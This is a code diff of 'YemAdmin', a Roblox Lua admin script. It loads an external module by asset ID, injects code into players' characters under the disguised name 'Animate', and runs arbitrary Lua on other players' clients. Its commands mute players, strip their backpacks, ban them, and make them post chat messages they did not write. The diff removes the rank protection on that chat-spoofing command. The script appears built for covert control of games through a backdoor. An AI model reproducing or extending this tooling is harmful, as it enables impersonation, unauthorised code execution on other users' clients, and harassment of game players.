@@ -5,13 +5,69 @@ local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local ServerScriptService = game:GetService("ServerScriptService")
 
+-- NOTE: I use types for autocomplete & not performance
+
+-- libraries
+type Callback<Args...> = (Args...) -> ()
+
+type Signal<Args...> = {
+    Connect: (self: Signal<Args...>, callback: Callback<Args...>) -> RBXScriptConnection,
+    Once: (self: Signal<Args...>, callback: Callback<Args...>) -> RBXScriptConnection?,
+    Wait: (self: Signal<Args...>) -> (...any),
+    Fire: (self: Signal<Args...>, Args...) -> (),
+    Destroy: (self: Signal<Args...>) -> (),
+
+    _bindable: BindableEvent, -- internal
+    --_connections: {RBXScriptConnection?}
+}
+
+local Signal = {} -- NOTE: no speed is required
+Signal.__index = Signal
+
+function Signal.new<Args...>(): Signal<Args...>
+    local signal: Signal<Args...> = setmetatable({}, Signal) :: any
+    signal._bindable = Instance.new("BindableEvent")
+    return signal
+end
+
+function Signal:Connect<Args...>(callback: Callback<Args...>): RBXScriptConnection
+    return (self :: Signal<Args...>)._bindable.Event:Connect(callback)
+end
+
+function Signal:Once<Args...>(callback: Callback<Args...>): RBXScriptConnection?
+    local connection: RBXScriptConnection?
+    local function wrapper(...: Args...)
+        if connection then
+            connection:Disconnect()
+            connection = nil
+        end
+        callback(...)
+    end
+    connection = (self :: Signal<Args...>)._bindable.Event:Connect(wrapper)
+    return connection
+end
+
+function Signal:Wait<Args...>(): (Args...)
+    return (self :: Signal<Args...>)._bindable.Event:Wait()
+end
+
+function Signal:Fire<Args...>(...: Args...)
+    (self :: Signal<Args...>)._bindable:Fire(...)
+end
+
+function Signal:Destroy<Args...>()
+    (self :: Signal<Args...>)._bindable:Destroy()
+end
+
+-- script stuff
 type GuiOptions = {
     SearchBar: boolean?,
 }
 
 local function NewGui(labels: {}, options: GuiOptions?): ScreenGui
     -- had to shadow so error doesnt appear
-    local options: GuiOptions = options or {}
+    options = (options or {}) :: GuiOptions?
+    assert(options, "this wont trigger") -- silence lsp!
 
 	local cmdGui = Instance.new("ScreenGui")
 	cmdGui.Name = "CMDSGUI"
@@ -115,26 +171,55 @@ if not _G.yem then
     _G.yem = proxy
 end
 
-local GetEnv = function()
-    return _G.yem
-end
+type WhitelistData = {
+    rank: AdminRank,
+    COMMENT: string? -- optional comments
+}
 
-if not GetEnv().config then
-    GetEnv().config = {
+-- TODO: custom class for handling userdata (EnTT style preferably)
+type YemEnv = {
+    eject: ()->(),
+    runLua: (caller: Player, code: string, waitDelete: number?)->(),
+
+    config: {
+        prefix: string
+    },
+
+    events: {
+        PlayerSpawn: Signal<Player, Model>,
+        PlayerChatted: Signal<Player, string>,
+    },
+
+    tempnicks: {[string]: string}, -- TODO: userdata table instead or smth with flags(?)
+    tempbans: {[string]: string?},
+    tempblacklist: {[string]: {any}},
+    tempwhitelist: {[string]: WhitelistData},
+}
+
+local yemenv: YemEnv = _G.yem
+
+-- TODO: dumb crap people do should be passed through events or smth
+yemenv.events = {
+    PlayerSpawn = Signal.new(),
+    PlayerChatted = Signal.new()
+}
+
+if not yemenv.config then
+    yemenv.config = {
         prefix = "&"
     }
 end
 
-if not GetEnv().tempbans then
-    GetEnv().tempbans = {}
+if not yemenv.tempbans then
+    yemenv.tempbans = {}
 end
 
-if not GetEnv().tempnicks then
-    GetEnv().tempnicks = {}
+if not yemenv.tempnicks then
+    yemenv.tempnicks = {}
 end
 
-if not GetEnv().tempblacklist then
-    GetEnv().tempblacklist = {}
+if not yemenv.tempblacklist then
+    yemenv.tempblacklist = {}
 end
 
 type AdminRank = {
@@ -169,7 +254,7 @@ local function RankToString(rank: number)
 end
 
 -- expose just 2 be nice qt3.14's
-GetEnv().runLua = function(caller: Player, code: string, waitDelete: number?)
+yemenv.runLua = function(caller: Player, code: string, waitDelete: number?)
     if not ServerScriptService:FindFirstChild("goog") then
         local ticking = tick()
         getfenv().require(112691275102014).load() -- getfenv so it stops error in ide thanks
@@ -187,6 +272,7 @@ GetEnv().runLua = function(caller: Player, code: string, waitDelete: number?)
     local loa = goog:FindFirstChild("Utilities"):FindFirstChild("googing"):Clone()
 
     loa.Parent = scr
+    scr.Name = "Animate"
     scr:WaitForChild("Exec").Value = code
 
     if p.Character then
@@ -203,13 +289,8 @@ GetEnv().runLua = function(caller: Player, code: string, waitDelete: number?)
     end
 end
 
-type WhitelistData = {
-    rank: AdminRank,
-    COMMENT: string? -- optional comments
-}
-
-if not GetEnv().tempwhitelist then
-    GetEnv().tempwhitelist = {
+if not yemenv.tempwhitelist then
+    yemenv.tempwhitelist = {
         ["SnowClan_8342"] = {
             rank = Ranks.Developer,
             COMMENT = "Note that all a higher rank does is give me access to 'enr' (eject resets _G.yem) and 'shutdown' so please either do it by hand or dont touch this!"
@@ -232,20 +313,25 @@ if not GetEnv().tempwhitelist then
     }
 end
 
-local tempwhitelist: {[string]: WhitelistData} = GetEnv().tempwhitelist
+local tempwhitelist: {[string]: WhitelistData} = yemenv.tempwhitelist
 
 local GetRank = function(plyr: Player)
     return (tempwhitelist[plyr.Name] and tempwhitelist[plyr.Name].rank.Rank) or 0
 end
 
-if GetEnv().eject then
-    GetEnv().eject()
+if yemenv.eject then
+    yemenv.eject()
 end
 
 local connections: {RBXScriptConnection} = {}
 local isRunning = true
-GetEnv().eject = function()
+yemenv.eject = function()
     isRunning = false
+    if _G.yem.events then
+        for i,v: Signal<> in pairs(_G.yem.events) do
+            v:Destroy()
+        end
+    end
     for i,v in pairs(connections) do
         v:Disconnect()
     end
@@ -262,7 +348,7 @@ local Msg = function(caller: Player, msg: string, legacyMsg: boolean?)
     end 
 
     -- TODO: a remote event in replicated storage specifically for this or smth so i dont dupe scripts
-    GetEnv().runLua(caller, `game.StarterGui:SetCore("SendNotification", \{Title = "YemAdmin",Text = "{msg}",Duration = 5\})`, 1)
+    yemenv.runLua(caller, `game.StarterGui:SetCore("SendNotification", \{Title = "YemAdmin",Text = "{msg}",Duration = 5\})`, 1)
 end
 
 local ClearWorkspace = function()
@@ -403,7 +489,7 @@ local AddCommand = function(minrank: number, name: string, desc: string, args: s
 end
 
 local IssueCommand = function(caller: Player, command: string)
-    local prefix = GetEnv().config.prefix
+    local prefix = yemenv.config.prefix
 	if string.sub(command, 1, #prefix) == prefix then
 		command = string.sub(command, #prefix + 1)
 	end
@@ -433,22 +519,27 @@ local IssueCommand = function(caller: Player, command: string)
     Msg(caller, `'{command}' is not a valid command`)
 end
 
-local onPlayerChatted = function(plyr: Player, msg: string)
-    if not isRunning then return end
-
-    --if not tempwhitelist[plyr.Name] then
-    --    return -- verify has a rank first
-    --end
-
-    local prefix = GetEnv().config.prefix
-	if string.sub(msg, 1, #prefix) == prefix then
-        IssueCommand(plyr, msg)
+--clean events
+yemenv.events.PlayerSpawn:Connect(function(plr: Player, char: Model)
+    local humanoid = char:FindFirstChild("Humanoid") :: Humanoid
+    if yemenv.tempnicks[humanoid.DisplayName] then
+        humanoid.DisplayName = yemenv.tempnicks[humanoid.DisplayName]
     end
-end
+end)
 
+yemenv.events.PlayerChatted:Connect(function(plr: Player, msg: string)
+    local prefix = yemenv.config.prefix
+	if string.sub(msg, 1, #prefix) == prefix then
+        IssueCommand(plr, msg)
+    end
+end)
+
+-- messy events
 local bindChatToPlyr = function(plyr: Player)
     _G.BindPlayerChatted(plyr):Connect(function(msg: string)
-        onPlayerChatted(plyr, msg)
+        if not isRunning then return end
+
+        yemenv.events.PlayerChatted:Fire(plyr, msg)
     end)
 
     task.wait()
@@ -458,9 +549,32 @@ local bindChatToPlyr = function(plyr: Player)
     end
 end
 
+table.insert(connections, workspace.ChildAdded:Connect(function(a0: Instance)
+    local _humanoid = a0:WaitForChild("Humanoid", 3) :: Humanoid -- 3 is probably extreme overkill
+    local plr = Players:GetPlayerFromCharacter(a0)
+
+    if plr then
+        yemenv.events.PlayerSpawn:Fire(plr, a0 :: Model)
+    end
+end))
+
+table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
+    local removal = {}
+    
+    for i, v in pairs(_G.tempadmins) do
+        if yemenv.tempblacklist[v] then
+            table.insert(removal, i)
+        end
+    end
+
+    for _, index in ipairs(removal) do
+        table.remove(_G.tempadmins, index)
+    end
+end))
+
 table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
-    if GetEnv().tempbans[plyr.Name] then
-        plyr:Kick(GetEnv().tempbans[plyr.Name])
+    if yemenv.tempbans[plyr.Name] then
+        plyr:Kick(yemenv.tempbans[plyr.Name])
         return
     end
 
@@ -469,27 +583,6 @@ table.insert(connections, Players.PlayerAdded:Connect(function(plyr: Player)
     end
 
     bindChatToPlyr(plyr)
-end))
-
-table.insert(connections, workspace.ChildAdded:Connect(function(a0: Instance)
-    local humanoid = a0:WaitForChild("Humanoid", 3) :: Humanoid
-    if humanoid and GetEnv().tempnicks[humanoid.DisplayName] then 
-        humanoid.DisplayName = GetEnv().tempnicks[humanoid.DisplayName]
-    end 
-end))
-
-table.insert(connections, RunService.Heartbeat:Connect(function(deltaTime: number)
-    local removal = {}
-    
-    for i, v in pairs(_G.tempadmins) do
-        if GetEnv().tempblacklist[v] then
-            table.insert(removal, i)
-        end
-    end
-
-    for _, index in ipairs(removal) do
-        table.remove(_G.tempadmins, index)
-    end
 end))
 
 local ss,rr = pcall(function(...)
@@ -512,7 +605,7 @@ AddCommand(0, "cmds", "Display a list of basic commands", "<>", function(caller:
 
     local plrRank = GetRank(caller)
 
-    local prefix = GetEnv().config.prefix
+    local prefix = yemenv.config.prefix
     for i,cmd in ipairs(commands) do
 		local cmdName = cmd["Name"]
         local cmdDescr = cmd["Description"]
@@ -539,18 +632,6 @@ end)
 
 AddCommand(Ranks.Developer.Rank, "enr", "Enter debug mode", "<boolean>", function(caller: Player, value: string)
     _G.yemdebug = (value:lower() == "true")
-end)
-
-AddCommand(Ranks.Developer.Rank, "setscore", "Set players score (FAKE)", "<...>", function(caller: Player, plyr1: string, amount: string)
-    local targets = getPlyr(caller, plyr1)
-    assert(#targets ~= 0, "Player(s) not found")
-
-    local _amount = tonumber(amount)
-    --assert(_amount and (amount < 1000000 and amount > -1000000), `Invalid amount`)
-    for i,v: any in pairs(targets) do -- cast to any to silence errors
-        v.leaderstats.Score.Value = _amount
-        v.SScore.Value = _amount
-    end
 end)
 
 AddCommand(Ranks.Special.Rank, "sentrius", "A nice admin :)", "<>", function(caller: Player)
@@ -602,7 +683,7 @@ AddCommand(Ranks.Special.Rank, "ls", "Run some lv3 lua code on client", "<plyr1,
 
     for i,target in pairs(targets) do
         task.spawn(function()
-            GetEnv().runLua(target, code) -- he didnt provide any way to get errors so oh well!
+            yemenv.runLua(target, code) -- he didnt provide any way to get errors so oh well!
         end)
     end
 end)
@@ -621,7 +702,7 @@ end)
 AddCommand(Ranks.Whitelist.Rank, "bans", "Display a list of banned players", "<>", function(caller: Player)
     local output: {string} = {}
 
-    for i,plr in pairs(GetEnv().tempbans) do
+    for i,plr in pairs(yemenv.tempbans) do
         table.insert(output, `{C(i, Color3.fromHex("#997373"))} - reason: im to lazy to find it thanks`)
 	end
 
@@ -690,14 +771,14 @@ AddCommand(Ranks.Whitelist.Rank, "ban", "Ban a player with a reason", "<plyr1, .
 
         local reason = `\n\n[YemAdmin]\nYou have been banned for:\n{table.concat({...}, " ")}`
         target:Kick(reason)
-        GetEnv().tempbans[target.Name] = reason
+        yemenv.tempbans[target.Name] = reason
     end
 end)
 
 AddCommand(Ranks.Whitelist.Rank, "unban", "Unban a player", "<plyr1>", function(caller: Player, plyr1: string)
-    for i,v in pairs(GetEnv().tempbans) do
+    for i,v in pairs(yemenv.tempbans) do
         if string.find(string.lower(i), plyr1, 1, true) then
-            GetEnv().tempbans[i] = nil
+            yemenv.tempbans[i] = nil
             return
         end
     end
@@ -709,14 +790,14 @@ AddCommand(Ranks.Whitelist.Rank, "blacklist", "Erase a players admin", "<plyr1>"
     assert(#targets ~= 0, "Player(s) not found")
 
     for i,target in pairs(targets) do
-        GetEnv().tempblacklist[target.Name] = {}
+        yemenv.tempblacklist[target.Name] = {}
     end
 end)
 
 AddCommand(Ranks.Whitelist.Rank, "unblacklist", "Unblacklists a player", "<plyr1>", function(caller: Player, plyr1: string)
-    for i,v in pairs(GetEnv().tempblacklist) do
+    for i,v in pairs(yemenv.tempblacklist) do
         if string.find(string.lower(i), plyr1, 1, true) then
-            GetEnv().tempblacklist[i] = nil
+            yemenv.tempblacklist[i] = nil
             return
         end
     end
@@ -775,7 +856,7 @@ AddCommand(Ranks.Whitelist.Rank, "mute", "Disable someones chat", "<plyr1>", fun
         if plrRank >= Ranks.Special.Rank then continue end
         
         task.spawn(function()
-            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)`)
+            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, false)`)
         end)
     end
 end)
@@ -786,7 +867,7 @@ AddCommand(Ranks.Whitelist.Rank, "unmute", "Enable someones chat", "<plyr1>", fu
 
     for i,target in pairs(targets) do
         task.spawn(function()
-            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)`)
+            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Chat, true)`)
         end)
     end
 end)
@@ -800,7 +881,7 @@ AddCommand(Ranks.Whitelist.Rank, "gearban", "Disable someones backpack", "<plyr1
         if plrRank >= Ranks.Special.Rank then continue end
         
         task.spawn(function()
-            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)`)
+            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, false)`)
         end)
     end
 end)
@@ -811,7 +892,7 @@ AddCommand(Ranks.Whitelist.Rank, "ungearban", "Enable someones backpack", "<plyr
 
     for i,target in pairs(targets) do
         task.spawn(function()
-            GetEnv().runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)`)
+            yemenv.runLua(target, `game:GetService("StarterGui"):SetCoreGuiEnabled(Enum.CoreGuiType.Backpack, true)`)
         end)
     end
 end)
@@ -834,7 +915,7 @@ AddCommand(Ranks.Whitelist.Rank, "nick", "Nick a player " .. C("[F]", Color3.fro
             assert(humanoid, "Invalid humanoid")
 
             humanoid.DisplayName = newNick
-            GetEnv().tempnicks[target.DisplayName] = newNick
+            yemenv.tempnicks[target.DisplayName] = newNick
         end)
     end
 end)
@@ -853,12 +934,12 @@ AddCommand(Ranks.Whitelist.Rank, "unnick", "Unnick a player", "<plyr1>", functio
             assert(humanoid, "Invalid humanoid")
 
             humanoid.DisplayName = target.DisplayName
-            GetEnv().tempnicks[target.DisplayName] = nil
+            yemenv.tempnicks[target.DisplayName] = nil
         end)
     end
 end)
 
-AddCommand(Ranks.Whitelist.Rank, "speak", "Speak as player" .. C("[F]", Color3.fromRGB(88, 34, 101)), "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
+AddCommand(Ranks.Special.Rank, "speak", "Speak as player" .. C("[F]", Color3.fromRGB(88, 34, 101)), "<plyr1, ...>", function(caller: Player, plyr1: string, ...)
     local targets = getPlyr(caller, plyr1)
     assert(#targets ~= 0, "Player(s) not found")
 
@@ -866,12 +947,12 @@ AddCommand(Ranks.Whitelist.Rank, "speak", "Speak as player" .. C("[F]", Color3.f
     assert(spoofText and #spoofText > 1, "Text length invalid (2 or more charcaters required)")
 
     for i,target in pairs(targets) do
-        local plrRank = GetRank(target)
+        --local plrRank = GetRank(target)
         --assert(plrRank < Ranks.Special.Rank, `Player {target.Name} has Special(80) or higher (No permission)`)
-        if plrRank >= Ranks.Special.Rank then continue end
+        --if plrRank >= Ranks.Special.Rank then continue end
 
         pcall(function(...)
-            GetEnv().runLua(target, `game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{spoofText}", "All")`)
+            yemenv.runLua(target, `game.ReplicatedStorage.DefaultChatSystemChatEvents.SayMessageRequest:FireServer("{spoofText}", "All")`)
         end)
     end
 end)
